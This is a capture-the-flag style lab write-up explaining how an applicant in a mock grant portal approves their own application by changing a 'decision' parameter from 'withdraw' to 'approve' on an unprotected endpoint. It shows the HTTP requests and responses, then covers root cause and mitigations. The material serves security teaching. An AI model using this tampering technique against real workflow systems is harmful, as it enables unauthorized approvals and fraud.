---
title: "IDOR – Unauthorized Grant Approval via Workflow Manipulation | Briarcliff Foundation"
date: 2026-06-01 18:50:00 +0530
categories: [A01 - Broken Access Control, IDOR]
tags: [webverselabs-pro, idor, broken-access-control, authorization-bypass, workflow-manipulation, flask]
author: Shivansh Sharma
image:
    path: /assets/images/posts/briarcliff-foundation-idor.webp
    alt: IDOR vulnerability in Briarcliff Foundation grant application workflow
---


## Lab Link

Lab: [Briarcliff Foundation](https://dashboard.webverselabs-pro.com/challenges/rubber-stamp)

---

## Overview

Briarcliff Foundation provides an online portal where applicants can submit grant proposals and track their review status.

Applicants are expected to manage only their own submissions, while approval decisions are reserved for internal review committee members.

However, the application exposes a shared workflow endpoint that accepts decision actions directly from the client. Because the backend fails to verify whether the user is authorized to perform privileged workflow operations, an applicant can approve their own submission.

This vulnerability results in unauthorized workflow manipulation through an Insecure Direct Object Reference (IDOR).

---

## Objective

Manipulate the application review workflow and approve a grant application without reviewer privileges.

---

## Vulnerability Identification

### Classification Hierarchy

```text
A01 - Broken Access Control
└── Insecure Direct Object Reference (IDOR)
    └── Missing Function Level Authorization
        └── Unauthorized Workflow Manipulation
```

---

## Reconnaissance

Create a new grant application.

The application submits requests similar to:

```http
POST /api/applications HTTP/2
Content-Type: application/x-www-form-urlencoded

title=Testing&summary=testing+functionality&amount=6000&timeline=6+months
```

After submission, the application redirects to:

```text
/applications/BCF-2026-0148
```

The application detail page displays the current review status and provides an option to withdraw the application.

---

## Discovering the Workflow Endpoint

Inspecting the page source reveals the JavaScript used by the withdrawal feature:

```javascript
fetch('/api/applications/' + encodeURIComponent(appId) + '/decision', {
    method: 'POST',
    credentials: 'same-origin',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        decision: 'withdraw',
        comment: ''
    })
})
```

This reveals an internal decision-processing endpoint:

```text
/api/applications/<application-id>/decision
```

and a user-controlled parameter:

```json
{
  "decision": "withdraw"
}
```

---

## Testing the Endpoint

Capture the legitimate withdrawal request:

```http
POST /api/applications/BCF-2026-0148/decision HTTP/2
Content-Type: application/json

{
  "decision":"withdraw",
  "comment":""
}
```

Response:

```json
{
  "decision":"withdraw",
  "id":"BCF-2026-0148",
  "ok":true,
  "status":"withdrawn"
}
```

The endpoint clearly performs workflow state transitions.

---

## Enumerating Available Decisions

To identify valid workflow actions, submit an invalid value:

```http
POST /api/applications/BCF-2026-0148/decision HTTP/2
Content-Type: application/json

{
  "decision":"",
  "comment":""
}
```

The server responds with a verbose validation error:

```json
{
  "allowed":[
    "approve",
    "decline",
    "defer",
    "withdraw"
  ],
  "error":"Unknown decision ''.",
  "ok":false
}
```

This reveals additional workflow actions intended for internal reviewers.

---

## Exploitation

Replace the applicant action:

```json
{
  "decision":"withdraw"
}
```

with:

```json
{
  "decision":"approve"
}
```

Modified request:

```http
POST /api/applications/BCF-2026-0148/decision HTTP/2
Content-Type: application/json

{
  "decision":"approve",
  "comment":""
}
```

Server response:

```json
{
  "decision":"approve",
  "id":"BCF-2026-0148",
  "ok":true,
  "status":"approved"
}
```

The server processes the request successfully despite the user not having reviewer permissions.

---

## Proof of Exploitation

### Initial Status

```text
Pending Review
```

### Unauthorized Request

```json
{
  "decision":"approve"
}
```

### Final Status

```text
Approved
```

The application is now marked as approved without any committee involvement.

---

## Root Cause Analysis

The application reuses the same backend workflow endpoint for:

* Applicant actions
* Reviewer actions

Although the frontend only exposes the **Withdraw** option, the backend accepts privileged workflow values supplied directly by the client.

The server never verifies whether the authenticated user is authorized to perform:

```text
approve
decline
defer
```

operations.

As a result, users can invoke reviewer functionality by modifying request parameters.

---

## Impact

An attacker could:

* Approve their own applications
* Decline legitimate submissions
* Manipulate workflow states
* Bypass the review process
* Tamper with grant decisions

In a real grant-management system, this could lead to financial fraud, workflow corruption, and unauthorized allocation of funds.

---

## Mitigation

### Enforce Server-Side Authorization

Workflow actions should be validated against the authenticated user's role before processing.

### Separate User and Reviewer Functions

Applicant actions and reviewer actions should not share the same endpoint.

### Implement Role-Based Access Control

Restrict privileged decisions such as:

```text
approve
decline
defer
```

to authorized reviewer accounts only.

### Avoid Excessive Error Disclosure

Do not expose internal workflow actions through validation errors.

### Validate Every State Transition

The backend should verify:

```text
User Role
AND
Application Ownership
AND
Permitted State Transition
```

before updating workflow status.

---

## Real-World Insight

Many access control vulnerabilities occur because developers rely on frontend restrictions rather than backend authorization.

Removing a button from the UI does not remove access to the underlying functionality.

Attackers routinely inspect JavaScript, intercept requests, and manipulate parameters to access hidden actions.

The Briarcliff Foundation challenge demonstrates a key security principle:

**Every sensitive action must be protected by server-side authorization, regardless of whether it is exposed in the user interface.**
